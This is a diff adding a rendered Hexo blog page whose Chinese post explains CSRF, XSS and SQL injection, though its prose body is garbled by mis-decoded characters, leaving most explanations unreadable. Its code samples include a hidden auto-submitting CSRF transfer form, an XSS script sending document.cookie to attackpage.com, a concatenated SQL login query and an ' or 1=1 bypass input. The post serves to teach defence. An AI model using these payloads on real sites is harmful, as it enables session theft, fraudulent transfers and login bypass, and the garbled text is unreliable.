@@ -1,0 +1,405 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="小树不倒我不倒">
+    <meta name="keyword"  content="">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+          常见的几种前端安全问题及其原理解析 - undefined
+        
+    </title>
+
+    <link rel="canonical" href="http://www.brucecave.com/2020/03/22/常见的几种前端安全问题及其原理解析/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/hux-blog.min.css">
+
+    <!-- Pygments Highlight CSS -->
+    <link rel="stylesheet" href="/css/highlight.css">
+
+    <!-- Custom Fonts -->
+    <!-- <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+    <!-- Hux change font-awesome CDN to qiniu -->
+    <link href="https://cdn.staticfile.org/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+
+    <!-- Hux Delete, sad but pending in China
+    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/
+    css'>
+    -->
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Bruce&#39;s cave</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    
+<!-- Image to hack wechat -->
+<!-- <img src="http://www.brucecave.com/img/icon_wechat.png" width="0" height="0"> -->
+<!-- <img src="{{ site.baseurl }}/{% if page.header-img %}{{ page.header-img }}{% else %}{{ site.header-img }}{% endif %}" width="0" height="0"> -->
+
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        background-image: url('/img/123123.jpg')
+    }
+</style>
+<header class="intro-header" >
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                    </div>
+                    <h1>常见的几种前端安全问题及其原理解析</h1>
+                    <h2 class="subheading"></h2>
+                    <span class="meta">
+                        Posted by Bruce Chen on
+                        2020-03-22
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+    <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <p>��Ȼ�ںܶ�������ǰ�˹���ʦ����ддҳ��дд�����߼���Ȼ������ӿڰ�������Ⱦ��ȥ�������ˣ��������簲ȫʲô�����ⶼ�����ְλ��ȫ�޹ء�������ʵ��Ϊÿ���������û���ֱ�ӽӴ�����ǰ��ҳ����˵��ǰ�����������簲ȫ����©���������������ܴ󲿷�©������Ҫ������޸����������˵��������webǰ�˰�ȫ���⣺</p>
+<ol>
+<li>CSRF��cross site request forgery����վ����α�죩</li>
+<li>XSS��cross site script����վ�����ű���</li>
+<li>SQLע��</li>
+</ol>
+<hr>
+<h3 id="1-CSRF"><a href="#1-CSRF" class="headerlink" title="# 1.CSRF"></a># 1.CSRF</h3><p>CSRF���ǿ�վ����α�죬�������������û���cookie���Լ�α��ɺϷ��û��Ӷ���Ŀ����վ���������������ͨ��һ��ͼ�����������ԭ��</p>
+<html>
+<img src="https://mmbiz.qpic.cn/mmbiz_png/WlIksv5EUJk6BjIveOWTsAZiceJOxCziaoLcTGYPvwb0WCZiaA9hiaYz3y4co4fnJR7czrJmGJTaUZqzbj6eFmzYOQ/640?wx_fmt=png"/>
+</html>
+
+<p>CSRF������Ҫ�������¼���������<br>1.Ŀ����վAʹ��cookie����֤�û�����<br>2.�û���¼��Ŀ����վA����cookie����Ӳ���У�<br>3.�û�û�еǳ���Ŀ����վA</p>
+<p>���������ϼ��������������������忴��CSRF�ľ�����̣�<br/><br>�������û���¼��Ŀ����վA������1������վA�ķ�����������Cookie���û���ʹ���û����ݱ���֤������2����Ȼ���û���С�ķ����˹����ߵĶ�����վB������3������ʱ����վB�Ϲ�����ͨ��ĳ���ֶ�ʹ���û��ڲ�֪�������´���ԭ�ȵ�cookie�����˶�Ŀ����վA�Ķ������󣨲���4������վA���յ�֮�����cookie����Ϊ���û����������������Ӧ���Ӷ�ʹ�����ߴﵽĿ��</p>
+<p>һ�㲽��4����ƭ�ֶ����£�</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// 1.Ʃ������վ�ڵ�ͼƬ��Դ��Ǳ������ת�˲���</span><br><span class="line">&lt;img src=http://www.bank.example/transfer?toBankId=hello&amp;amount=1000000 width=&apos;0&apos; height=&apos;0&apos;&gt;</span><br><span class="line"></span><br><span class="line">// 2.������������ر�������ͨ���ű��ύ��������</span><br><span class="line">&lt;iframe style=&quot;display: none;&quot; name=&quot;csrf-frame&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;form method=&apos;POST&apos; action=&apos;http://www.bank.example/transfer&apos; target=&quot;csrf-frame&quot; id=&quot;csrf-form&quot;&gt;</span><br><span class="line">  &lt;input type=&apos;hidden&apos; name=&apos;toBankId&apos; value=&apos;hello&apos;&gt;</span><br><span class="line">  &lt;input type=&apos;hidden&apos; name=&apos;amount&apos; value=&apos;1000000&apos;&gt;</span><br><span class="line">  &lt;input type=&apos;submit&apos; value=&apos;submit&apos;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script&gt;document.getElementById(&quot;csrf-form&quot;).submit()&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>���û��򿪶�����վ����Щ������վ�Ľű��ͻ�ִ�У��Ӷ�ʹ�û��ڲ�֪�������·�������</p>
+<p>���Կ���������CSRF��ʵ���õĶ����û����Է���Ϊ������ǰ�˻���û��ʲô�취������ֻ�ܿ���˶�����������<br>1.ͨ�����������referer�ֶΣ�referer�ֶα�ʾ�����û�ͨ���ĸ���վ����վ�������󣬵������������������������ܹ���ȷ����referer�ֶΣ������ͨ��������ô��������򲻿ɿ���<br>2.ͨ���������ַ�м�token����֤<br>3.�û����������ȫ��ʶ��������ʶ�����վ</p>
+<hr>
+<h3 id="2-XSS"><a href="#2-XSS" class="headerlink" title="2.XSS"></a>2.XSS</h3><p>XSS����վ�ű�����������ͨ����������ҳ��ע���ִ�ж���js�ű���Ȼ��Է��ʸ�ҳ����û����𹥻����ֶ�</p>
+<p>��վ�ű����Է�Ϊ���֣�</p>
+<html>
+<img src="https://mmbiz.qpic.cn/mmbiz_png/WlIksv5EUJk6BjIveOWTsAZiceJOxCziaoJicR9nAsCzqwbPG68NxDFK5chtkczH3oVwx0YTX7dTx6MpCIMbibIWuQ/640?wx_fmt=png"/>
+</html>
+
+<h4 id="cookie�ٳ�"><a href="#cookie�ٳ�" class="headerlink" title="cookie�ٳ�"></a>cookie�ٳ�</h4><p>����һ��ҳ���и����ۿ򣬵�����������ڸ�ҳ��ķ�����û�н������Ĺ��ˣ����¼����������Ҳ�ᱻ���浽���ݿ��У���ҳ�����ʱ�ͻ�����Ĵ��롣���£�<br/></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot;%&gt;</span><br><span class="line">&lt;form action=&quot;saveComment.jsp&quot; method=&quot;post&quot;&gt; </span><br><span class="line">     �������������ݣ�&lt;BR&gt; </span><br><span class="line">     &lt;input name=&quot;content&quot; type=&quot;text&quot;&gt; </span><br><span class="line">     &lt;input type=&quot;submit&quot; value=&quot;ȷ��&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
+<p>��ʱ�����߷����������ۿ����������´��룺<br/></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.open(&quot;http://www.attackpage.com/record?secret=&quot; + document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>��ô�������û�������������ʱ�����Ѿ������ˣ��û��������cookie�ͻᱻ���͵�<a href="http://www.attackpage.com��������ߵķ�������ȥ���������������������Щcookieð���û����в�����" target="_blank" rel="noopener">www.attackpage.com��������ߵķ�������ȥ���������������������Щcookieð���û����в�����</a></p>
+<h4 id="�Uα��"><a href="#�Uα��" class="headerlink" title="�Ựα��"></a>�Ựα��</h4><p>ͬ�������ۿ�Ϊ����ֻ������ʱ����������Ĳ�����һ���Լ��ķ�����������ֱ������һ������һ����վ���������£�<br/></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=http://www.bank.example/transfer?toBankId=hello&amp;amount=1000000 width=&apos;0&apos; height=&apos;0&apos;&gt;</span><br></pre></td></tr></table></figure>
+<p>���û�������������ʱ������û�֮ǰ��½��bank��վ����ô�ͻᱻ���������ã���bank����ת�����󣬴Ӷ����﹥����Ŀ��</p>
+<h4 id="�����������ִ��"><a href="#�����������ִ��" class="headerlink" title="�����������ִ��"></a>�����������ִ��</h4><ul>
+<li>Ʃ��������ʢ�е���ҳ��Ϸ�����ȡ�</li>
+<li>Ʃ��ɴ�ֱ�������ҳ�濨�������ԡ�</li>
+<li>Ʃ������ѭ����</li>
+<li>���Կ�����XSS�����ǱȽ������ģ���������Ҫ���з������ܽ��������ֶεĹ���������������Ҳ��������������˷�������ִ�У�</li>
+</ul>
+<ol>
+<li>��ȫ������ǰ�˵����룬����������Ľ��й���</li>
+<li>cookie����Ϊhttp-only���������޷�ͨ���ű���ȡcookie��</li>
+<li>cookie�ŵ�����Ҫ��cookie�з����κ��漰��˽����Ϣ</li>
+</ol>
+<hr>
+<h3 id="3-SQLע��"><a href="#3-SQLע��" class="headerlink" title="3.SQLע��"></a>3.SQLע��</h3><p>SQLע��������ú�̨�����������ݵĴ��������©�������̨����һЩ�ܹ�Ӱ���˴�����������ݣ���һ�������򵥵�����˵һ�£���Ȼ��ǰ�������Ǻ�˶�����û�й��ˣ���<br>ǰ����һ���������£�</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot;%&gt;</span><br><span class="line">&lt;form action=&quot;login.jsp&quot; method=&quot;post&quot;&gt; </span><br><span class="line">     �������û��������룺&lt;BR&gt; </span><br><span class="line">     &lt;input name=&quot;name&quot; type=&quot;text&quot;&gt; </span><br><span class="line">     &lt;input name=&quot;password&quot; type=&quot;text&quot;&gt; </span><br><span class="line">     &lt;input type=&quot;submit&quot; value=&quot;��½&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
+
+<p>����˶Ա������ύ���ݵĴ������£�</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String sql = &quot;SELECT * FROM  users  WHERE name = &apos;&quot; + name + &quot;&apos; AND password = &apos;&quot; + password + &quot;&apos;&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>����������ڱ������룺</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name = &apos; or 1=1</span><br><span class="line">password=&apos;anything&apos;</span><br></pre></td></tr></table></figure>
+<p>��ô��˵Ĵ���������ǣ�</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM  users  WHERE name = &apos;&apos;&apos; or 1=1 AND password = &apos;anything&apos;;</span><br></pre></td></tr></table></figure>
+<p>��ô��ʱ�����߾Ϳ����ƿ���¼������¼����վ��</p>
+
+
+                <hr>
+
+                
+
+                <ul class="pager">
+                    
+                    
+                        <li class="next">
+                            <a href="/2020/02/23/JS隐形转换的规则/" data-toggle="tooltip" data-placement="top" title="JS隐形转换的规则">Next Post &rarr;</a>
+                        </li>
+                    
+                </ul>
+
+                
+
+                
+
+            </div>
+    <!-- Side Catalog Container -->
+        
+
+    <!-- Sidebar Container -->
+
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+
+                <!-- Friends Blog -->
+                
+            </div>
+
+        </div>
+    </div>
+</article>
+
+
+
+
+
+
+
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                
+                
+                
+
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/bbrucechen">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; Bruce&#39;s cave 2020 
+                    <br>
+                    Theme by <a href="http://huangxuan.me" target="_blank" rel="noopener">Hux</a> 
+                    <span style="display: inline-block; margin: 0 5px;">
+                        <i class="fa fa-heart"></i>
+                    </span> 
+                    Ported by <a href="http://blog.kaijun.rocks" target="_blank" rel="noopener">Kaijun</a> | 
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="91px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=kaijun&repo=hexo-theme-huxblog&type=star&count=true" >
+                    </iframe>
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/hux-blog.min.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- 
+     Because of the native support for backtick-style fenced code blocks 
+     right within the Markdown is landed in Github Pages, 
+     From V1.6, There is no need for Highlight.js, 
+     so Huxblog drops it officially.
+
+     - https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0  
+     - https://help.github.com/articles/creating-and-highlighting-code-blocks/    
+-->
+<!--
+    <script>
+        async("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function(){
+            hljs.initHighlightingOnLoad();
+        })
+    </script>
+    <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet">
+-->
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("http://www.brucecave.com/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+
+
+<!-- Baidu Tongji -->
+
+
+<!-- Side Catalog -->
+
+
+
+
+
+<!-- Image to hack wechat -->
+<img src="http://www.brucecave.com/img/icon_wechat.png" width="0" height="0" />
+<!-- Migrate from head to bottom, no longer block render and still work -->
+
+</body>
+
+</html>
